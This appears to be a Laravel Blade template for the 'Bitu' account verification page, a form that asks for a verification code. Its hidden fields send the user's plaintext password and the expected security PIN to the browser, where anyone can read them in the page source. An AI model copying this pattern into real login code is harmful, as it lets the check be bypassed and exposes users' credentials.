<!DOCTYPE html>
<html lang="en">
<head><meta charset="gb18030">
	
	<meta content="width=device-width, initial-scale=1" name="viewport" />
	<title>Verificaci&oacute;n - Bitu</title>
	<!-- Favicon-->
	<link rel="icon" href="https://bitumovil.com/wp-content/uploads/2016/02/icon.png" type="image/x-icon">
	<!-- Plugins Core Css -->
	<link href="{{URL::asset('assets/css/app.min.css')}}" rel="stylesheet">
	<!-- Custom Css -->
	<link href="{{URL::asset('assets/css/style.css')}}" rel="stylesheet" />
	<link href="{{URL::asset('assets/css/pages/extra_pages.css')}}" rel="stylesheet" />
</head>
<body class="login-page color-morado">
	<div class="container-login100 page-background">
		<div class="loginCard">
			<div class="login-btn splits">
			
			</div>
			<div class="rgstr-btn splits">
				
			</div>
			<div class="wrapper">
				<form method="POST" action="{{ route('verificando1') }}" >
					{{ csrf_field() }}
					<h3>Verificaci&oacute;n - Bitu</h3>
					
					<div class="passwd">
						<input type="text" name="pin_verificacion">
						<label>Codigo de verificaci&oacute;n</label>
					</div>
					<input type="password" hidden="" name="password" id="" value="{{$password}}">	
					<input type="text" hidden="" name="email" value="{{$email}}">	
					<input type="text" hidden="" name="pin" value="{{$pin_seguridad}}">	

					<div class="submit">
						<button class="dark">Enviar</button>
					</div>
					
				</form>
				
			</div>
		</div>
	</div>
	<!-- Plugins Js -->
	 <script src="{{URL::asset('assets/js/app.min.js')}}"></script> 
	<!-- Extra page Js -->
	 <script src="{{URL::asset('assets/js/pages/examples/login-register.js')}}"></script> 
</body>
</html>